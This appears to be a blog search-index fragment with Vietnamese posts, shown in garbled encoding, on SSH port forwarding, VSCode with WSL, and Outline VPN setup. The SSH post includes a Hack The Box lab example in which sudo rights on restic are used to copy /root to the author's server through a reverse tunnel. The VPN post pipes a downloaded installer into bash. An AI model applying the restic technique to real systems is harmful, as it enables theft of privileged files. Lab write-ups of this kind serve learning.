l·∫°i kh√¥ng mu·ªën public trang web ƒë√≥ ra m√† ch·ªâ mu·ªën s·ª≠ d·ª•ng ·ªü tr√™n local. Ho·∫∑c l√† b·∫°n ƒëang ·ªü nh√†, b·∫°n mu·ªën v√†o trang web ƒë∆∞·ª£c ƒë·∫∑t tr√™n server c·ªßa c√¥ng ty m√† ch·ªâ ƒë∆∞·ª£c v√†o v·ªõi ip n·ªôi b·ªô. Nh∆∞ng b·∫°n l·∫°i c√≥ SSH ƒë·∫øn server ƒë√≥, v·∫≠y b·∫°n c√≥ th·ªÉ chuy·ªÉn ti·∫øp port t·ª´ server c·ªßa c√¥ng ty v·ªÅ port tr√™n m√°y b·∫°n b·∫±ng c√°ch.\n1  ssh -L 9000:127.0.0.1:80 user@\u0026lt;ip address\u0026gt;   V·∫≠y b√¢y gi·ªù b·∫°n c√≥ th·ªÉ truy c·∫≠p v√†o website n·∫±m tr√™n server c√¥ng ty b·∫±ng c√°ch truy c·∫≠p http://localhost:9000.\nHay m·ªôt v√≠ d·ª• kh√°c l√† b·∫°n mu·ªën truy c·∫≠p database tr√™n website c·ªßa b·∫°n nh∆∞ng b·∫°n kh√¥ng th√≠ch d√πng terminal m√† b·∫°n l·∫°i th√≠ch d√πng giao di·ªán h∆°n. V·∫≠y b·∫°n c√≥ th·ªÉ chuy·ªÉn c·ªïng 3306 tr√™n server v·ªÅ local m√°y b·∫°n r·ªìi s·ª≠ d·ª•ng m·ªôt s·ªë ch∆∞∆°ng tr√¨nh ƒë·ªÉ truy c·∫≠p CSDL c·ªßa b·∫°n nh∆∞ Navicat hay Workbench Mysql.\nRemote Port Forwarding SSH Remote Port Forwarding cho ph√©p b·∫°n chuy·ªÉn l∆∞u l∆∞·ª£ng truy c·∫≠p t·ª´ 1 port ·ªü m√°y c·ªßa b·∫°n l√™n SSH server.\nC√∫ ph√°p\n1  ssh -R 8080:localhost:80 public.example.com   ƒêi·ªÅu n√†y cho ph√©p b·∫•t c·ª© ai truy c·∫≠p v√†o m√°y ch·ªß public.example.com v√†o c·ªïng 8080 s·∫Ω ƒë∆∞·ª£c chuy·ªÉn ƒë·∫øn c·ªïng 80 tr√™n m√°y b·∫°n.\nTuy nhi√™n, Remote Port Forwarding m·∫∑c ƒë·ªãnh ƒë∆∞·ª£c t·∫Øt tr√™n SSH. ƒê·ªÉ k√≠ch ho·∫°t t√≠nh nƒÉng n√†y, b·∫°n c·∫ßn th√™m m·ªôt d√≤ng v√†o t·ªáp c·∫•u h√¨nh SSH /etc/ssh/sshd_config\n1  GatewayPorts yes   V√† kh·ªüi ƒë·ªông l·∫°i SSH\n1  $ sudo service ssh restart   V√≠ d·ª• V√≠ d·ª• b·∫°n ƒëang code 1 website, nh∆∞ng kh√°ch h√†ng ƒëang mu·ªën b·∫°n demo t·ª´ xa. Do code ƒëang n·∫±m tr√™n m√°y b·∫°n, v√† b·∫°n kh√¥ng c√≥ th·ªùi gian deploy l√™n server ƒë·ªÉ demo cho kh√°ch h√†ng. B·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng Remote Port Forwarding ƒë·ªÉ chuy·ªÉn c·ªïng web tr√™n m√°y local l√™n server ƒë·ªÉ demo cho kh√°ch h√†ng.\n1  ssh -R 80:localhost:80 user@\u0026lt;ip public\u0026gt;   V·∫≠y kh√°ch h√†ng c√≥ th·ªÉ truy c·∫≠p t·ªõi http://l√† c√≥ th·ªÉ v√†o trang m√† b·∫°n ƒëang code tr√™n local r·ªìi.\nHo·∫∑c m·ªôt v√≠ d·ª• kh√°c, ƒë√¢y l√† m·ªôt v√≠ d·ª• v·ªÅ m·ªôt machine t√™n Registry tr√™n Hackthebox.\nT·∫°i server machine cho ph√©p user www-data s·ª≠ d·ª•ng c√¢u l·ªánh v·ªõi quy·ªÅn root nh∆∞ sau:\n1 2  User www-data may run the following commands on bolt: (root) NOPASSWD: /usr/bin/restic backup -r rest*   Restic l√† 1 opensource s·ª≠ d·ª•ng ƒë·ªÉ backup, c·∫ßn s·ª≠ d·ª•ng Restic server ƒë·ªÉ backup. Tuy nhi√™n tr√™n server l·∫°i kh√¥ng c√≥ Restic server. V·∫≠y n√™n m√¨nh ƒë√£ d·ª±ng m·ªôt Restic server ·ªü tr√™n m√°y local v√† s·ª≠ d·ª•ng Remote Port Forwarding ƒë·ªÉ k·∫øt n·ªëi Restic server l√™n machine.\n1  ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159   V√† sau ƒë√≥ m√¨nh ƒë√£ backup l·∫°i ƒë∆∞·ª£c th∆∞ m·ª•c /root v·ªõi quy·ªÅn root\n1 2 3 4 5 6 7 8 9 10 11 12  www-data@bolt:~/html$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000 /root \u0026lt;n/restic backup -r rest:http://127.0.0.1:8000 /root enter password for repository: 123123 password is correct found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them scan [/root] scanned 10 directories, 14 files in 0:00 [0:01] 100.00% 28.066 KiB / 28.066 KiB 24 / 24 items 0 errors ETA 0:00 duration: 0:01 snapshot e5ef88b3 saved www-data@bolt:~/html$   Machine n√†y ƒë√£ ƒë∆∞·ª£c m√¨nh vi·∫øt solusion ·ªü t·∫°i blog c·ªßa m√¨nh. N·∫øu b·∫°n ƒë·ªçc c·∫£m th·∫•y h·∫•p d·∫´n th√¨ c√≥ th·ªÉ gh√© qua blog c·ªßa m√¨nh t·∫°i https://minhtuanact.github.io/post/writeup-htb-registry/\nDynamic Port Forwarding Dynamic Port Forwarding cho ph√©p b·∫°n t·∫°o m·ªôt k·∫øt n·ªëi socket tr√™n m√°y local (ssh client) t·ªõi m√°y server (ssh server), ho·∫°t ƒë·ªông nh∆∞ m·ªôt m√°y ch·ªß SOCKS proxy. Khi client k·∫øt n·ªëi v·ªõi c·ªïng n√†y, k·∫øt n·ªëi ƒë∆∞·ª£c chuy·ªÉn ti·∫øp (Forwarding) ƒë·∫øn ssh server, sau ƒë√≥ ƒë∆∞·ª£c chuy·ªÉn ti·∫øp ƒë·∫øn m·ªôt c·ªïng ƒë·ªông (Dynamic Port) tr√™n m√°y ƒë√≠ch.\nB·∫±ng c√°ch n√†y, t·∫•t c·∫£ c√°c ·ª©ng d·ª•ng s·ª≠ d·ª•ng SOCKS proxy s·∫Ω k·∫øt n·ªëi v·ªõi ssh server v√† ssh server s·∫Ω chuy·ªÉn ti·∫øp t·∫•t c·∫£ l∆∞u l∆∞·ª£ng truy c·∫≠p ƒë·∫øn ƒë√≠ch th·ª±c t·∫ø c·ªßa n√≥. Ch√∫ng ta c√≥ th·ªÉ setup ƒë∆°n gi·∫£n nh∆∞ sau: C√∫ ph√°p:\n1  ssh -D 1080 -N user@\u0026lt;ip address\u0026gt;    N: Y√™u c·∫ßu SSH kh√¥ng th·ª±c hi·ªán l·ªánh t·ª´ xa. D 9090: M·ªü ƒë∆∞·ªùng h·∫ßm SOCKS theo s·ªë c·ªïng quy ƒë·ªãnh. user@: ƒê·ªãa ch·ªâ IP v√† ng∆∞·ªùi d√πng SSH t·ª´ xa. ƒê·ªÉ ch·∫°y l·ªánh trong n·ªÅn, h√£y d√πng -f. N·∫øu m√°y ch·ªß SSH c·ªßa b·∫°n ƒëang nghe tr√™n c·ªïng kh√°c v·ªõi 22 (m·∫∑c ƒë·ªãnh) th√¨ s·ª≠ d·ª•ng t√πy ch·ªçn -p [PORT_NUMBER].  Setup proxy tr√™n firefox s·ª≠ d·ª•ng SOCKS v5 ƒë·ªÉ k·∫øt n·ªëi, m·ªçi request t·ªõi c·ªïng n√†y ƒë·ªÅu ƒë∆∞·ª£c forward ƒë·∫øn SSH Server. V·∫≠y l√† b·∫°n c√≥ th·ªÉ ng·ªìi ·ªü VN nh∆∞ng l·∫°i ƒëang duy·ªát web ·ªü Singapore r·ªìi :joy:  Tr√™n ƒë√¢y l√† m·ªôt v√†i ki·∫øn th·ª©c m√¨nh l∆∞·ª£m nh·∫∑t ƒë∆∞·ª£c, mong r·∫±ng n√≥ c√≥ √≠ch cho c√°c b·∫°n. (seeyou)\n Tham kh·∫£o https://www.ssh.com/ssh/tunneling/\nhttps://www.booleanworld.com/guide-ssh-port-forwarding-tunnelling/\nhttps://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html\n","permalink":"https://minhtuanact.ml/posts/ssh-tunneling-local-port-forwarding-va-remote-port-forwarding-update-dynamic-port-forwarding/","summary":"SSH Tunneling Giao th·ª©c SSH hi·ªán nay l√† m·ªôt trong nh·ªØng giao th·ª©c ph·ªï bi·∫øn nh·∫•t ƒë·ªÉ tunneling v√† port forwarding. SSH Tunnel cho ph√©p trao ƒë·ªïi d·ªØ li·ªáu th√¥ng qua m·ªôt k√™nh m√£ ho√°. V·ªõi vi·ªác thi·∫øt l·∫≠p SSH Tunnel c·ª±c k·ª≥ ƒë∆°n gi·∫£n v√† nhi·ªÅu ·ª©ng d·ª•ng n√™n giao th·ª©c n√†y ng√†y c√†ng ph·ªï bi·∫øn. ·ªû b√†i vi·∫øt n√†y m√¨nh s·∫Ω n√≥i v·ªÅ m·ªôt s·ªë ·ª©ng d·ª•ng c·ªßa SSH Tunnel.","title":"SSH Tunneling - Local Port Forwarding v√† Remote Port Forwarding (update Dynamic Port Forwarding)"},{"content":" L∆∞u √Ω: B√†i vi·∫øt c√≥ ƒë∆∞a ra nhi·ªÅu √Ω ki·∫øn c√° nh√¢n, m·ªçi ng∆∞·ªùi c√πng ƒë·ªçc v√† tham kh·∫£o.\n Hi·ªán nay, vi·ªác s·ª≠ d·ª•ng Window v√† Linux (·ªü ƒë√¢y m√¨nh kh√¥ng n√≥i ƒë·∫øn macOS) l√† kh√° ph·ªï bi·∫øn ƒë·ªëi v·ªõi c√°c l·∫≠p tr√¨nh vi√™n. V√† c√≥ r·∫•t nhi·ªÅu l·∫≠p tr√¨nh vi√™n ƒëam m√™ kh√° nhi·ªÅu game. Nh∆∞ ·ªü c√¥ng ty m√¨nh th√¨ d√πng ubuntu (do c√¥ng ty ti·∫øt ki·ªám v√¨ mua Windows b·∫£n quy·ªÅn kh√° t·ªën k√©m), vi·ªác d√πng Linux c≈©ng c√≥ r·∫•t nhi·ªÅu c√°i hay, nh∆∞ng v·∫•n ƒë·ªÅ Linux v·∫´n ch∆∞a x·ª≠ l√Ω t·ªët ƒë√≥ l√† ch∆°i game, vi·ªác ch∆°i game th√¨ Windows n√≥i s·ªë 2 kh√¥ng ai d√°m ƒë·ª©ng nh·∫•t t·ª´ tr∆∞·ªõc ƒë·∫øn nay. Tuy nhi√™n vi·ªác g√µ code ·ªü tr√™n Linux l·∫°i ƒëem c·∫£m gi√°c t·ªët h∆°n l√† so v·ªõi Windows. Nhi·ªÅu l·∫≠p tr√¨nh vi√™n ·ªü c√¥ng ty s·ª≠ d·ª•ng Ubuntu, v·ªÅ nh√† l·∫°i d√πng Windows, c·∫£m gi√°c g√µ tr√™n Win l·∫°i kh√¥ng ƒë∆∞·ª£c \u0026ldquo;thu·∫≠n tay\u0026rdquo; cho l·∫Øm.\nV·∫≠y l√†m th·∫ø n√†o ƒë·ªÉ v·ª´a ch∆°i game s∆∞·ªõng nh∆∞ Windows, m√† v·ª´a g√µ code s∆∞·ªõng nh∆∞ Linux Th·∫≠t may l√† tr√™n Windows c√≥ Windows Subsystem for Linux (WSL) m√† t√¥i ƒë√£ gi·ªõi thi·ªáu ·ªü b√†i vi·∫øt tr∆∞·ªõc, n√≥ th·∫≠t s·ª± m·∫°nh. Windows ƒë√£ t√≠ch h·ª£p nh√¢n c·ªßa Linux v√†o Windows, tuy ch∆∞a th·∫≠t s·ª± ho√†n h·∫£o nh∆∞ng Microsoft ƒëang c·ªë g·∫Øng t√≠ch h·ª£p ho√†n to√†n Linux v√†o Windows ·ªü b·∫£n WSL 2 s·∫Øp t·ªõi.\nAi c≈©ng bi·∫øt l√† kh·∫£ nƒÉng ch∆°i game tr√™n Windows ƒë∆∞·ª£c Windows h·ªó tr·ª£ t·∫≠n ch√¢n rƒÉng nh∆∞ th·∫ø n√†o. V·∫≠y g√µ code tr√™n Windows th√¨ sao ƒê·∫ßu ti√™n, ch√∫ng ta c·∫ßn ph·∫£i c√†i ƒë·∫∑t WSL l√™n m√°y Windows c·ªßa m√¨nh. H∆∞·ªõng d·∫´n ƒë·∫ßy ƒë·ªß t·∫°i ƒë√¢y https://docs.microsoft.com/en-us/windows/wsl/install-win10\nHi·ªán nay, anh em trong group c·ªßa m√¨nh ch·ªß y·∫øu s·ª≠ d·ª•ng VSCode ƒë·ªÉ l·∫≠p tr√¨nh (trong ƒë√≥ c≈©ng c√≥ m√¨nh). R·∫•t may m·∫Øn l√† VSCode ƒë∆∞·ª£c t√≠ch h·ª£p kh·∫£ nƒÉng k·∫øt n·ªëi t·ªõi WSL. Ch√∫ng ta c·∫ßn c√†i ƒë·∫∑t Visual Studio Code Remote - WSL extension, ti·ªán √≠ch n√†y s·∫Ω gi√∫p cho ch√∫ng ta ch·∫°y c√°c l·ªánh v√† c√°c ti·ªán √≠ch m·ªü r·ªông kh√°c tr·ª±c ti·∫øp trong WSL, ƒë·ªÉ ta c√≥ th·ªÉ ch·ªânh s·ª≠a c√°c t·ªáp n·∫±m trong WSL ho·∫∑c h·ªá th·ªëng t·ªáp Windows ƒë∆∞·ª£c g√°n (v√≠ d·ª• /mnt/c) m√† kh√¥ng ph·∫£i lo l·∫Øng v·ªÅ c√°c v·∫•n ƒë·ªÅ ƒë∆∞·ªùng d·∫´n, kh·∫£ nƒÉng t∆∞∆°ng th√≠ch nh·ªã ph√¢n ho·∫∑c c√°c h·ªá ƒëi·ªÅu h√†nh ch√©o kh√°c.\nM·ªü m·ªôt th∆∞ m·ª•c t·ª´ xa ho·∫∑c kh√¥ng gian l√†m vi·ªác T·ª´ WSL Terminal T∆∞∆°ng t·ª± nh∆∞ s·ª≠ d·ª•ng Linux\n M·ªü WSL l√™n v√† tr·ªè ƒë·∫øn ƒë∆∞·ªùng d·∫´n th∆∞ m·ª•c project mu·ªën m·ªü tr√™n VSCode. G√µ code . v√† ch·ªù VSCode t√¨m v√† n·∫°p to√†n b·ªô file trong project v√† c√°c m√£ c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y trong WSL.  Sau m·ªôt l√°t th√¨ VSCode m·ªü ra v√† ch√∫ng ta c√≥ th·ªÉ th·∫•y m·ªôt ch·ªâ m·ª•c n·∫±m ·ªü ph√≠a cu·ªëi g√≥c tr√°i\nT·ª´ VS Code ·∫§n F1 r·ªìi ch·ªçn Remote-WSL: New windows\nT·ª´ CMD Command Line C√≥ th·ªÉ m·ªü VSCode v·ªõi WSL b·∫±ng l·ªánh --remote v·ªõi c√∫ ph√°p\n1  code --remote wsl+\u0026lt;distro name\u0026gt; \u0026lt;path in WSL\u0026gt;   V√≠ d·ª•:\n1  code --remote wsl+Ubuntu /home/minhtuan/owasp_guide   L√†m vi·ªác v·ªõi Git Ta c≈©ng c√≥ th·ªÉ l√†m vi√™c v·ªõi Git m·ªôt c√°ch b√¨nh th∆∞·ªùng gi·ªëng nh∆∞ tr√™n Linux v·∫≠y.\nQu·∫£n l√Ω ti·ªán √≠ch m·ªü r·ªông B√™n c·∫°nh ƒë√≥ VSCode c≈©ng t√≠ch h·ª£p vi·ªác c√†i extension ·ªü local ri√™ng v√† ·ªü WSL ri√™ng, r·∫•t ti·ªán l·ª£i.\nM·ªü Terminal tr√™n WSL Vi·ªác m·ªü m·ªôt Terminal tr√™n WSL r·∫•t ƒë∆°n gi·∫£n, khi ƒëang s·ª≠ d·ª•ng VSCode v·ªõi WSL, th√¨ m·ªçi c·ª≠a s·ªï Terminal ƒë∆∞·ª£c m·ªü s·∫Ω ƒë∆∞·ª£c ch·∫°y tr√™n WSL ch·ª© kh√¥ng ph·∫£i ·ªü local.\nDebug tr√™n WSL Vi·ªác debug c≈©ng di·ªÖn ra nh∆∞ b√¨nh th∆∞·ªùng khi b·∫°n s·ª≠ d·ª•ng tr√™n local v·∫≠y.\nDocker ƒê·ªëi v·ªõi nh·ªØng d·ª± √°n c·∫ßn s·ª≠ d·ª•ng docker ƒë·ªÉ code cho ƒë·ªìng b·ªô th√¨ WSL c≈©ng ƒë∆∞·ª£c support v·ªõi docker. Tuy nhi√™n docker s·∫Ω ƒë∆∞·ª£c h·ªó tr·ª£ ho√†n to√†n v√†o phi√™n b·∫£n WSL 2 s·∫Øp t·ªõi khi ƒë∆∞·ª£c t√≠ch h·ª£p ƒë·∫ßy ƒë·ªß nh√¢n Linux tr√™n http://kernel.org/.\nTham kh·∫£o  https://docs.microsoft.com/en-us/windows/wsl/wsl2-about https://docs.microsoft.com/en-us/windows/wsl/install-win10 https://code.visualstudio.com/docs/remote/wsl  ","permalink":"https://minhtuanact.ml/posts/ban-thich-dung-windows-nhung-lai-muon-co-cam-giac-go-code-tren-linux/","summary":"L∆∞u √Ω: B√†i vi·∫øt c√≥ ƒë∆∞a ra nhi·ªÅu √Ω ki·∫øn c√° nh√¢n, m·ªçi ng∆∞·ªùi c√πng ƒë·ªçc v√† tham kh·∫£o.\n Hi·ªán nay, vi·ªác s·ª≠ d·ª•ng Window v√† Linux (·ªü ƒë√¢y m√¨nh kh√¥ng n√≥i ƒë·∫øn macOS) l√† kh√° ph·ªï bi·∫øn ƒë·ªëi v·ªõi c√°c l·∫≠p tr√¨nh vi√™n. V√† c√≥ r·∫•t nhi·ªÅu l·∫≠p tr√¨nh vi√™n ƒëam m√™ kh√° nhi·ªÅu game. Nh∆∞ ·ªü c√¥ng ty m√¨nh th√¨ d√πng ubuntu (do c√¥ng ty ti·∫øt ki·ªám v√¨ mua Windows b·∫£n quy·ªÅn kh√° t·ªën k√©m), vi·ªác d√πng Linux c≈©ng c√≥ r·∫•t nhi·ªÅu c√°i hay, nh∆∞ng v·∫•n ƒë·ªÅ Linux v·∫´n ch∆∞a x·ª≠ l√Ω t·ªët ƒë√≥ l√† ch∆°i game, vi·ªác ch∆°i game th√¨ Windows n√≥i s·ªë 2 kh√¥ng ai d√°m ƒë·ª©ng nh·∫•t t·ª´ tr∆∞·ªõc ƒë·∫øn nay.","title":"B·∫°n th√≠ch d√πng Windows nh∆∞ng l·∫°i mu·ªën c√≥ c·∫£m gi√°c g√µ code tr√™n Linux"},{"content":"Gi·ªõi thi·ªáu Ch·∫Øc h·∫≥n m·ªçi ng∆∞·ªùi c≈©ng c√≥ nghe n√≥i qua v·ªÅ VPN r·ªìi. VPN (Virtual Private Network) l√† m·ªôt m·∫°ng ri√™ng ·∫£o, s·ª≠ d·ª•ng internet ƒë·ªÉ k·∫øt n·ªëi 2 ƒë·ªãa ƒëi·ªÉm t·ª´ xa ho·∫∑c ng∆∞·ªùi d√πng v·ªõi m·ªôt m·∫°ng LAN.\nV·∫≠y s·ª≠ d·ª•ng VPN c√≥ m·ª•c ƒë√≠ch g√¨? T√πy theo m·ª•c ƒë√≠ch c·ªßa ng∆∞·ªùi s·ª≠ d·ª•ng VPN, c√≥ th·ªÉ k·∫øt n·ªëi t·ªõi server t·ª´ xa, truy c·∫≠p c√°c trang web b·ªã ch·∫∑n, hay l√† ƒë∆°n gi·∫£n ƒë·∫£m b·∫£o t√≠nh ri√™ng t∆∞ c·ªßa b·∫£n th√¢n khi k·∫øt n·ªëi v·ªõi c√°c m·∫°ng c√¥ng c·ªông.\nC√†i ƒë·∫∑t VPN Vi·ªác c√†i ƒë·∫∑t VPN tr√™n server c√° nh√¢n c≈©ng m·∫•t kh√° nhi·ªÅu th·ªùi gian v√† c√¥ng s·ª©c, c√°c b·∫°n c√≥ th·ªÉ tham kh·∫£o c√°ch c√†i OpenVPN hay c√°c tools h·ªó tr·ª£ vi·ªác c√†i ƒë·∫∑t VPN tr√™n internet. Nh∆∞ng h√¥m nay m√¨nh s·∫Ω gi·ªõi thi·ªáu v·ªõi c√°c b·∫°n c√°ch c√†i ƒë·∫∑t 1 VPN Server ƒë∆°n gi·∫£n nh·∫•t m√† m√¨nh ƒëang s·ª≠ d·ª•ng\nOutline VPN V·ªõi Outline VPN th√¨ vi·ªác c√†i ƒë·∫∑t VPN Server ƒë∆∞·ª£c tr·ªü n√™n c·ª±c k·ª≥ ƒë∆°n gi·∫£n ch·ªâ v·ªõi 1 d√≤ng l·ªánh. Ch·ªâ v·ªõi 1 d√≤ng l·ªánh th√¥i l√† c√°c b·∫°n ƒë√£ c√†i ƒë·∫∑t xong 1 VPN Server r·ªìi. C≈©ng kh√° nhi·ªÅu VPN Server c≈©ng c√†i ƒë·∫∑t ch·ªâ v·ªõi 1 d√≤ng l·ªánh nh∆∞ng m√¨nh v·∫´n th√≠ch s·ª≠ d·ª•ng Outline VPN h∆°n v√¨ s·ª± ti·ªán l·ª£i c·ªßa n√≥.\nOutline VPN l√† m·ªôt ph·∫ßn m·ªÅm m√£ ngu·ªìn m·ªü ƒë∆∞·ª£c Jigsaw (thu·ªôc Alphabet ‚Äì c√¥ng ty m·∫π c·ªßa Google) ph√°t tri·ªÉn. Outline s·ª≠ d·ª•ng docker n√™n ƒëem l·∫°i c·∫£m gi√°c an to√†n cho ng∆∞·ªùi s·ª≠ d·ª•ng. V√† Outline h∆∞·ªõng ƒë·∫øn r·∫±ng m·ªçi ng∆∞·ªùi ƒë·ªÅu c√≥ th·ªÉ c√†i VPN Server cho ri√™ng m√¨nh b·∫±ng c√°ch thi·∫øt l·∫≠p ƒë∆°n gi·∫£n nh·∫•t c√≥ th·ªÉ.\nƒê∆∞·ª£c chia l√†m 2 ph·∫ßn l√† Outline Manager v√† Outline Client. Outline Manager s·ª≠ d·ª•ng ƒë·ªÉ qu·∫£n l√Ω c√°c VPN Server c·ªßa m√¨nh, c√≤n Outline Client s·ª≠ d·ª•ng ƒë·ªÉ cho client k·∫øt n·ªëi l√™n server.\nC√†i ƒë·∫∑t T·∫•t c·∫£ c√°c b·∫£n c√†i ƒë·∫∑t c√°c b·∫°n c√≥ th·ªÉ t·∫£i t·∫°i ƒë√¢y Download Outline\nOutline Manager Outline Manager h·ªó tr·ª£ kh√° nhi·ªÅu n·ªÅn t·∫£ng ph·ªï bi·∫øn hi·ªán nay g·ªìm c√≥ Windows, Linux, macOS. C√°c b·∫°n c√≥ th·ªÉ t·∫£i ƒë√∫ng theo phi√™n b·∫£n m√°y m√¨nh ƒëang d√πng nh√© :D.\nB∆∞·ªõc 1: M·ªü giao di·ªán Outline Manager\n·ªû ƒë√¢y n√≥ y√™u c·∫ßu ch√∫ng ta setup Outline l√™n Server c·ªßa m√¨nh\nC√°c b·∫°n ch·ªçn theo ƒë√∫ng Server VPS m√† m√¨nh ƒëang s·ª≠ d·ª•ng, n·∫øu kh√¥ng r√µ th√¨ c·ª© ch·ªçn c√°i Set up Outline anywhere.\nB∆∞·ªõc 2: C√†i ƒë·∫∑t Outline Server l√™n VPS\nCopy ƒëo·∫°n code n√†y v√† th·ª±c thi tr√™n server\n1  sudo bash -c \u0026#34;$(wget -qO- https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_scripts/install_server.sh)\u0026#34;   C√¥ng vi·ªác ho√†n to√†n t·ª± ƒë·ªông, n·∫øu code ch·∫°y su√¥n s·∫ª th√¨ c√°c b·∫°n s·∫Ω nh·∫≠n ƒë∆∞·ª£c output nh∆∞ d∆∞·ªõi ƒë√¢y.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  \u0026gt; Verifying that Docker is installed .......... OK \u0026gt; Verifying that Docker daemon is running ..... OK \u0026gt; Creating persistent state dir ............... OK \u0026gt; Generating secret key ....................... OK \u0026gt; Generating TLS certificate .................. OK \u0026gt; Generating SHA-256 certificate fingerprint .. OK \u0026gt; Writing config .............................. OK \u0026gt; Starting Shadowbox .......................... OK \u0026gt; Starting Watchtower ......................... OK \u0026gt; Waiting for Outline server to be healthy .... OK \u0026gt; Creating first user ......................... OK \u0026gt; Adding API URL to config .................... OK \u0026gt; Checking host firewall ...................... OK CONGRATULATIONS! Your Outline server is up and running. To manage your Outline server, please copy the following line (including curly brackets) into Step 2 of the Outline Manager interface: {\u0026#34;apiUrl\u0026#34;:\u0026#34;https://3.0.213.165:16250/xxxxxxxxxxxxxxxxxxx\u0026#34;,\u0026#34;certSha256\u0026#34;:\u0026#34;xxxxxxxxxxxxxxx\u0026#34;} If you have connection problems, it may be that your router or cloud provider blocks inbound connections, even though your machine seems to allow them. Make sure to open the following ports on your firewall, router or cloud provider: - Management port 16250, for TCP - Access key port 28808, for TCP and UDP   B∆∞·ªõc 3: D√°n key nh·∫≠n ƒë∆∞·ª£c v√†o Outline Manager\nB·∫°n nh·∫≠n ƒë∆∞·ª£c ƒëo·∫°n key\n1  {\u0026#34;apiUrl\u0026#34;:\u0026#34;https://3.0.213.165:16250/xxxxxxxxxxxxxxxxxxx\u0026#34;,\u0026#34;certSha256\u0026#34;:\u0026#34;xxxxxxxxxxxxxxx\u0026#34;}   copy ch√∫ng v√† d√°n v√†o m·ª•c 2 tr√™n Outline Manager r·ªìi ·∫•n Done, v·∫≠y l√† ho√†n t·∫•t vi·ªác c·∫•u h√¨nh VPN Server r·ªìi.\nC√†i ƒë·∫∑t xong ch√∫ng ta s·∫Ω c√≥ 1 giao di·ªán qu·∫£n l√Ω VPN Server m√† m√¨nh t·∫°o ra. ·ªû ƒë√¢y c√≥ l∆∞·ª£ng data transferred / 30 days, kh√≥a qu·∫£n l√Ω v√† t·∫°o kh√≥a.\nOk r·ªìi, t·∫°m th·ªùi xong ·ªü b√™n Outline Manager, ti·∫øp t·ª•c ch√∫ng ta chuy·ªÉn sang Outline Client\nOutline Client Thi·∫øt l·∫≠p c·∫•u h√¨nh Outline Server xong r·ªìi, v·∫≠y m√¨nh mu·ªën k·∫øt n·ªëi th√¨ l√†m th·∫ø n√†o nh·ªâ? C·ª±c k·ª≥ ƒë∆°n gi·∫£n v·ªõi Outline Client.\nOutline Client h·ªó tr·ª£ ƒë·ªß th·ªÉ lo·∫°i t·ª´ Android, Windows, Chrome OS, iOS, macOS, Linux. G·∫ßn nh∆∞ l√† t·∫•t t·∫ßn t·∫≠t thi·∫øt b·ªã r·ªìi.\nT·∫£i v√† s·ª≠ d·ª•ng Outline Client r·∫•t ƒë∆°n gi·∫£n, v·ªõi 2 thao t√°c l√† b·∫°n c√≥ th·ªÉ k·∫øt n·ªëi ƒë·∫øn v·ªõi VPN c·ªßa m√¨nh r·ªìi.\nƒê·ªÉ k·∫øt n·ªëi v·ªõi Outline Server th√¨ ch√∫ng ta c·∫ßn c√≥ access code. C√°c b·∫°n ƒë·ªÉ √Ω b√™n Outline Manager c√≥ c√°i n√∫t bi·ªÉu t∆∞·ª£ng computer v·ªõi n√∫t share kh√¥ng. C√°c b·∫°n b·∫•m v√†o ƒë·∫•y th√¨ n√≥ s·∫Ω c·∫•p cho ch√∫ng ta 1 access code d∆∞·ªõi d·∫°ng ss://xxxx=@\u0026lt;ip-server\u0026gt;:\u0026lt;port\u0026gt;/?outline=1, copy access code ƒë·∫•y r·ªìi paste v√†o Outline Client l√† xong. Gi·ªù th√¨ c√°c b·∫°n c√≥ th·ªÉ d·ªÖ d√†ng k·∫øt n·ªëi m·∫°ng s·ª≠ d·ª•ng VPN r·ªìi :D.\nƒê√°nh gi√° Sau khi s·ª≠ d·ª•ng th√¨ m√¨nh c√≥ 1 v√†i nh·∫≠n x√©t nh∆∞ sau:\n Outline kh√° d·ªÖ s·ª≠ d·ª•ng, ngay c·∫£ vi·ªác c√†i ƒë·∫∑t c≈©ng c·ª±c k·ª≥ ƒë∆°n gi·∫£n, nh·∫•t l√† ph·∫ßn client h·ªó tr·ª£ ƒë·∫ßy ƒë·ªß c√°c thi·∫øt b·ªã m√¨nh ƒëang s·ª≠ d·ª•ng hi·ªán nay. Ph·∫ßn qu·∫£n l√Ω Outline Manager c≈©ng kh√° tr·ª±c quan, cho ph√©p m√¨nh ki·ªÉm tra l∆∞u l∆∞·ª£ng m√† m·ªói thi·∫øt b·ªã m√¨nh ƒëang s·ª≠ d·ª•ng l√† bao nhi√™u. M√¨nh th√¨ ƒëang s·ª≠ d·ª•ng VPS unlimited network n√™n c≈©ng kh√¥ng quan t√¢m v·ªÅ v·∫•n ƒë·ªÅ d√πng qu√° l∆∞u l∆∞·ª£ng m·∫°ng cho l·∫Øm :D C√≥ th·ªÉ qu·∫£n l√Ω nhi·ªÅu VPN Server c√πng 1 l√∫c th√¥ng qua 1 tr√¨nh qu·∫£n l√Ω th√¥i. Kh√° ƒë∆°n gi·∫£n v√† thu·∫≠n ti·ªán, v√† Outline Client c≈©ng c√≥ th·ªÉ th√™m nhi·ªÅu accesss code ƒë·ªÉ c√≥ th·ªÉ d·ªÖ d√†ng chuy·ªÉn sang m·ªôt VPN kh√°c. M√¨nh d√πng Outline c≈©ng ƒë∆∞·ª£c 6 th√°ng r·ªìi v√† c≈©ng ch∆∞a c√≥ t√Ω n√†o ph√†n n√†n v·ªÅ n√≥ c·∫£. M·ªçi th·ª©c v·∫´n kh√° ok.  L∆∞u √Ω 1 v√†i l∆∞u √Ω nh·ªè ƒë·ªëi v·ªõi c√°c b·∫°n th√¥i.\n S·ª≠ d·ª•ng VPS mi·ªÖn ph√≠ c√†ng nhi·ªÅu bƒÉng th√¥ng c√†ng t·ªët, m√¨nh g·∫∑p nhi·ªÅu tr∆∞·ªùng h·ª£p v√¨ k·∫øt n·ªëi ƒë·∫øn VPN qu√° nhi·ªÅu d·∫´n t·ªõi l∆∞u l∆∞·ª£ng m·∫°ng truy c·∫≠p s·ª≠ d·ª•ng VPS qu√° l·ªõn, th√†nh ra ph·∫£i tr·∫£ ti·ªÅn cho l∆∞u 